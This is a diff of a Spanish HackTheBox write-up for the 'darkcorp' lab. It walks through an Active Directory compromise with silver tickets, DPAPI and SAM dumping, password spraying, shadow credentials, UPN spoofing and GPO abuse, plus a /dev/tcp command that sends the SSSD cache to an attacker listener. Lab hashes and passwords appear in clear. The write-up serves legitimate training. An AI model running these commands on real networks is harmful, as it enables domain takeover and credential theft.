 Como podemos ver, tenemos el certificado de la cuenta del equipo del dominio de `WEB-01.pfx`, por lo que ahora con certipy vamos a pedir un `TGT` a nombre de la cuenta del equipo `WEB-01`.
 
@@ -814,21 +814,21 @@ Como podemos ver, tenemos el certificado de la cuenta del equipo del dominio de 
 sudo proxychains -q certipy auth -pfx 'WEB-01.pfx' -domain darkcorp.htb -dc-ip 172.16.20.1
 ```
 
-![[Pasted image 20260504215754.png]]
+![](<img/Pasted image 20260504215754.png>)
 Una vez hemos conseguido el hash NT de la máquina con `certipy`, ahora vamos a conseguir el `DOMAIN SID`, para ello utilizamos el hash que tenemos.
 
 ```bash
 proxychains -q lookupsid.py -hashes :8f33c7fc7ff515c1f358e488fbb8b675 'darkcorp.htb/WEB-01$@DC-01.darkcorp.htb'
 ```
 
-![[Pasted image 20260504220022.png]]
+![](<img/Pasted image 20260504220022.png>)
 Una vez lo tenemos, ya podemos pedir un `Silver Ticket` para el Admin local de `WEB-01`
 
 ```bash
 ticketer.py -nthash 8f33c7fc7ff515c1f358e488fbb8b675 -domain darkcorp.htb -domain-sid S-1-5-21-3432610366-2163336488-3604236847 -spn cifs/web-01.darkcorp.htb Administrator
 ```
 
-![[Pasted image 20260504220104.png]]
+![](<img/Pasted image 20260504220104.png>)
 Una vez tenemos el archivo `.ccache` lo utilizamos contra `web-01`, en este caso utilizaremos `netexec` ya que el `Silver Ticket` no nos sirve poder conectarnos por `WINRM` solo para SMB, por lo que primero revisamos si tenemos admin. Una vez pone `pwned` en `nxc` podemos dumpear la sam tanto con `--sam` o con `secretdmp.py`.
 
 ```bash
@@ -837,14 +837,14 @@ KRB5CCNAME=Administrator.ccache proxychains -q netexec smb web-01.darkcorp.htb -
 KRB5CCNAME=Administrator.ccache proxychains -q netexec smb web-01.darkcorp.htb -k --use-kcache --sam
 ```
 
-![[Pasted image 20260504220150.png]]
+![](<img/Pasted image 20260504220150.png>)
 perfecto, una vez lo tenemos, podemos usar `winrm` para conectarnos a `WEB-01` como admin.
 
 ```bash
 proxychains -q /home/isma/.local/share/gem/ruby/3.4.0/bin/evil-winrm -i 172.16.20.2 -u administrator -H 88d84ec08dad123eb04a060a74053f21
 ```
 
-![[Pasted image 20260504220756.png]]
+![](<img/Pasted image 20260504220756.png>)
 Una vez dentro podemos larpear de la flag de `user` .
 
 ```powershell
@@ -852,102 +852,102 @@ cd ..\Desktop
 type user.txt
 ```
 
-![[Pasted image 20260504221013.png]]
+![](<img/Pasted image 20260504221013.png>)
 Bueno vamos a búscar algo interesante.
 
 ```bash
 tree /f .
 ```
 
-![[Pasted image 20260504221023.png]]
+![](<img/Pasted image 20260504221023.png>)
 Un script de powershell llamado `cleanup.ps1` ... huele a tarea `CRON` (se que estamos en winwdos pero es mejor que decir `tarea automatizada` :P). Vamos a listar su contendio.
 
 ```powershell
 type Documents\cleanup\cleanup.ps1
 ```
 
-![[Pasted image 20260504221302.png]]
+![](<img/Pasted image 20260504221302.png>)
 En este caso simplemente revisa si el servicio `w3svc` (web IIS) esta corriendo y si no, lo ejecuta.
 
 ```powershell
 Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} | Select-Object TaskName, @{Name="User";Expression={$_.Principal.UserId}}, @{Name="Command";Expression={($_.Actions.Execute + " " + $_.Actions.Arguments).Trim()}} | Format-Table -AutoSize
 ```
 
-![[Pasted image 20260504221647.png]]
+![](<img/Pasted image 20260504221647.png>)
 Pero si revisamos más info sobre la tarea, encontramos que lo ejecuta nuestro propio usuario. Eso quiere decir que la cred esta almacenada usando `DPAPI` asi que vamos a dumpearlo, en este caso podríamos modificar el script para dumpear `DPAPI` ya que con winrm no podemos, pero en este caso simplemente utilizaremos `netexec`.
 
 ```bash
 KRB5CCNAME=Administrator.ccache proxychains -q netexec smb 172.16.20.2 -u administrator --use-kcache --dpapi
 ```
 
-![[Pasted image 20260504224147.png]]
+![](<img/Pasted image 20260504224147.png>)
 Perfecto, vamos a probar estas creds almacenadas, las probamos.
 
 ```bash
 proxychains -q netexec smb 172.16.20.2 -u administrator -p But_Lying_Aid9! --local-auth
 ```
 
-![[Pasted image 20260504224237.png]]
+![](<img/Pasted image 20260504224237.png>)
 En este caso que funcionan, dumpeamos la `DPAPI` y ahora como tenemos la passwd en texto plano y `--local-auth` nos da una nueva credencial. Esto ocurre porque al final con el silver ticket tenemos `privilegios` sobre las `Master Keys` almacenadas en el perfil local del usuario, por lo cual cuando lo volvemos a hacer con las creds, nos devuelve la cred `Pack_Beneath_Solid9!`. Una vez tenemos esto, vamos a listar todos los usuarios del dominio, para probar la nueva cred.
 
 ```cmd
 proxychains -q netexec smb 172.16.20.1 -u victor.r -p victor1gustavo@# --users
 ```
-![[Pasted image 20260504224531.png]]
+![](<img/Pasted image 20260504224531.png>)
 Vale una vez tenemos la lista, usamos awk para filtrar por la columna 5 y quitamos cualquier línea que comience con \[ * ].
 
 ```cmd
 proxychains -q netexec smb 172.16.20.1 -u victor.r -p victor1gustavo@# --users | awk '{print $5}' | grep -v '[\[-]' > users.txt
 ```
-![[Pasted image 20260504224742.png]]
+![](<img/Pasted image 20260504224742.png>)
 Una vez hemos creado este diccionario, vamos a hacer passwd spraying.
 
 ```bash
 proxychains -q netexec smb 172.16.20.1 -u users.txt -p 'Pack_Beneath_Solid9!' --continue-on-success
 ```
 
-![[Pasted image 20260504224708.png]]
+![](<img/Pasted image 20260504224708.png>)
 En este caso tenemos login sobre el usuario `john.w` si revisamos `bloodhound` encontramos que el usuario `john.w` tiene generic write sobre el usuario `angela.w`. Esto quiere decir que tenemos varias opciones, podríamos hacer shadow creds, upn spoofing o configurar el `SPN` para hacer kerberoasting.
-![[Pasted image 20260504224821.png]]
-![[Pasted image 20260504225219.png]]
+![](<img/Pasted image 20260504224821.png>)
+![](<img/Pasted image 20260504225219.png>)
 la cosa es que adicionalmente existe otro usuario llamado `angela.w.adm` el cual es parte del grupo de `LINUX_ADMINS`, por lo cual el camino claro es `UPN SPOOFING`. Pero antes de hacer este vamos a utilizar `certipy shadow auto` para pillar el hash para después del `UPN SPOOFING` poder perdir TGT pero autenticarnos como `angela.w`.
 
 ```bash
 proxychains -q certipy shadow auto -username john.w -p Pack_Beneath_Solid9! -account angela.w -target dc-01.darkcorp.htb
 ```
-![[Pasted image 20260504224926.png]]
+![](<img/Pasted image 20260504224926.png>)
 Una vez lo tenemos podemos verificar que funcionan.
 
 ```bash
 proxychains -q netexec smb 172.16.20.1 -u angela.w -H 957246c8137069bca672dc6aa0af7c7a
 ```
 
-![[Pasted image 20260504224943.png]]
+![](<img/Pasted image 20260504224943.png>)
 Antes de nada, verificamos si el upn esta vacio o si tiene algo.
 
 ```bash
 proxychains -q python3 /opt/bloodyAD/bloodyAD.py --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' get object angela.w | grep userPrincipalName
 ```
-![[Pasted image 20260504225850.png]]
+![](<img/Pasted image 20260504225850.png>)
 En este caso el `UPN Spoofing` hace que pongamos como un alias a el usuario. En este caso le decimos que su alias sea `angela.w.adm`.
 
 ```bash
 proxychains -q /opt/bloodyAD/bloodyAD.py --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' set object angela.w userPrincipalName -v angela.w.adm
 ```
-![[Pasted image 20260504230001.png]]
+![](<img/Pasted image 20260504230001.png>)
 En este caso dice haber funcionado, vamos a revisar de nuevo el `UPN`.
 
 ```bash
 proxychains -q /opt/bloodyAD/bloodyAD.py --domain darkcorp.htb --host dc-01 -u john.w -p 'Pack_Beneath_Solid9!' get object angela.w | grep "userPrincipalName"
 ```
 
-![[Pasted image 20260504230136.png]]
+![](<img/Pasted image 20260504230136.png>)
 Perfecto, ya esta configurado, ahora vamos a pedir un `TGT`, en este caso le indicaremos que resuelva por `NT_ENTERPRISE` que básicamente quiere deic rpor el `UPN` en vez de por el `sAMAccountName`.
 
 ```bash
 proxychains -q getTGT.py -hashes :957246c8137069bca672dc6aa0af7c7a -principalType 'NT_ENTERPRISE' darkcorp.htb/angela.w.adm
 ```
-![[Pasted image 20260504230230.png]]
+![](<img/Pasted image 20260504230230.png>)
 De nuevo, simplificando, lo que hemos hecho es pedir un ticket con el nombre de `angela.w` pero con el alias `angela.w.adm` y como resuelve por `NT_ENTERPRISE` este lo genera a nombre de `angela.w.adm` por mucho de que sea de `angela.w` por lo que cuando lo usemos para auth contra linux (en el contexto de ksu), este simplemente verificara el "nombre" al cual esta y que sea valido y en este caso como pone `angela.w.adm` este nos deja loguearnos como ese user.
 
 Por lo que vamos a pasarnos el `.ccache` a la máquina pivote donde estaba `ebelford`.
@@ -956,57 +956,57 @@ Por lo que vamos a pasarnos el `.ccache` a la máquina pivote donde estaba `ebel
 python3 -m http.server 8082
 ```
 
-![[Pasted image 20260504230443.png]]
+![](<img/Pasted image 20260504230443.png>)
 
 ```bash
 wget http://10.10.14.141:8082/angela.w.adm.ccache
 ```
 
-![[Pasted image 20260504230437.png]]
+![](<img/Pasted image 20260504230437.png>)
 Una vez lo tenemos lo pasamos a `/dev/shm`
 
 ```bash
 cp angela.w.adm.ccache /dev/shm/
 ```
 
-![[Pasted image 20260504230516.png]]
+![](<img/Pasted image 20260504230516.png>)
 Ahora simplemente pedimos cambiar de user con `ksu` usando el ticket `TGT`.
 
 ```bash
 KRB5CCNAME=angela.w.adm.ccache.1 ksu angela.w.adm
 ```
-![[Pasted image 20260504231004.png]]
+![](<img/Pasted image 20260504231004.png>)
 verificamos sudo
 
 ```bash
 sudo -l && sudo -i
 ```
-![[Pasted image 20260504231042.png]]
+![](<img/Pasted image 20260504231042.png>)
 obviamente podemos usar sudo sin creds porque somos admin, así que nos hacemos `root`. Bueno vamos a verificar `SSSD` para ver si cachea creds. `SSSD` es el servicio que conecta a Linux con el `DC`. Por eso nos interesa revisar su config.
 
 ```bash
 cat /etc/sssd/sssd.conf
 ```
 
-![[Pasted image 20260504231202.png]]
+![](<img/Pasted image 20260504231202.png>)
 En este caso lo hace. vamos a listar el dir `/var/lib/sss/db`.
 
 ```bash
 ls /var/lib/sss/db
 ```
-![[Pasted image 20260504231233.png]]
+![](<img/Pasted image 20260504231233.png>)
 Perfecto, ahi tenemos el archivo cache, vamos a pasarlo con los alias de bash sobre los sockets de linux (obviamente nos ponemos en esucha con netcat).
 
-![[Pasted image 20261013135114.png]]
+![](<img/Pasted image 20261013135114.png>)
 
 ```bash
 cat cache_darkcorp.htb.ldb >> /dev/tcp/10.10.14.141/4444
 ```
-![[Pasted image 20260504231556.png]]
+![](<img/Pasted image 20260504231556.png>)
 ```bash
 sudo nc -nvlp 4444 > cache_darkcorp.htb.ldb
 ```
-![[Pasted image 20260504231602.png]]
+![](<img/Pasted image 20260504231602.png>)
 Vamos a buscar con las creds que tenemos sobre que usuario son:
 
 ```bash
@@ -1057,60 +1057,60 @@ Este se llama `taylod.b.adm` (otro admin), por lo que en este caso vamos a rompe
 ```bash
 cat cache_darkcorp.htb.ldb | strings -n 60 | grep '\$'
 ```
-![[Pasted image 20260504231853.png]]
+![](<img/Pasted image 20260504231853.png>)
 Lo rompemos con hashcat.
 
 ```bash
 hashcat hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-![[Pasted image 20260504232318.png]]
+![](<img/Pasted image 20260504232318.png>)
 Perfecto, tenemos. Vamos a probar las creds
 
 ```bash
 su - taylor.b.adm
 ```
-![[Pasted image 20260504232801.png]]
+![](<img/Pasted image 20260504232801.png>)
 Funcionan, vamos a ver si somos admin en el DC.
 
 ```bash
 proxychains -q netexec smb 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
 ```
 
-![[Pasted image 20260504232918.png]]
+![](<img/Pasted image 20260504232918.png>)
 No lo somos, vamos a ver si nos podemos loguear con winrm en el DC.
 
 ```bash
 proxychains -q netexec winrm 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
 ```
-![[Pasted image 20260504233148.png]]
+![](<img/Pasted image 20260504233148.png>)
 Perfecto, nos podemos loguearnos con WINRM.
 
 ```bash
 proxychains -q /home/isma/.local/share/gem/ruby/3.4.0/bin/evil-winrm -i 172.16.20.1 -u taylor.b.adm -p '!QAZzaq1'
 ```
-![[Pasted image 20260504233519.png]]
+![](<img/Pasted image 20260504233519.png>)
 Vamos a revisar los grupos.
 
 ```bash
 whoami /groups
 ```
-![[Pasted image 20260504234022.png]]
+![](<img/Pasted image 20260504234022.png>)
 En este caso, `tyler.b.adm` es parte del grupo GPO_MANAGER, vamos a sobre que directiva de grupo puede módificar desde `bloodhound`.
-![[Pasted image 20260504234116.png]]
+![](<img/Pasted image 20260504234116.png>)
 Perfecto, vamos a usar `gpoabuse` para que (una vez tengamos el identificador sobre la directiva de grupo.) este añada a `tyler.b.adm` como administrador local de el DC.
 
 ```bash
 proxychains -q python3 pygpoabuse.py 'darkcorp.htb/taylor.b.adm:!QAZzaq1' -gpo-id 652CAE9A-4BB7-49F2-9E52-3361F33CE786 -command 'net localgroup administrators taylor.b.adm /add' -f 
 ```
 
-![[Pasted image 20260504235329.png]]
+![](<img/Pasted image 20260504235329.png>)
 dice que lo ha funcionado, vamos a comprobarlo
 
 ```bash
 proxychains -q netexec smb dc-01 -u taylor.b.adm -p '!QAZzaq1'
 ```
-![[Pasted image 20260504235642.png]]
+![](<img/Pasted image 20260504235642.png>)
 Perf, vamos a dumpear los secrets (`SAM` y `LSA`)
 
 ```bash
@@ -1217,15 +1217,15 @@ WEB-01$:aes128-cts-hmac-sha1-96:7867cb5a59da118ad045a5da54039eae
 WEB-01$:des-cbc-md5:38e00bb3d901eaef
 [*] Cleaning up... 
 ```
-![[Pasted image 20260505000519.png]]
+![](<img/Pasted image 20260505000519.png>)
 Perf, vamos a hacer pass the hass como `Administrator` en el `DC-01` y vamos a larpear la flag.
 
 ```bash
 proxychains -q /home/isma/.local/share/gem/ruby/3.4.0/bin/evil-winrm -i 172.16.20.1 -u administrator -H fcb3ca5a19a1ccf2d14c13e8b64cde0f
 ```
-![[Pasted image 20260505000734.png]]
+![](<img/Pasted image 20260505000734.png>)
 [Hecho!!](https://labs.hackthebox.com/achievement/machine/3092965/647)
 
 <img src="https://tenor.com/view/druski-dance-jhud-show-the-jennifer-hudson-show-gif-11624980464939939705.gif" height="420" width="420">
-![[Pasted image 20260506203110.png]]
+![](<img/Pasted image 20260506203110.png>)
 
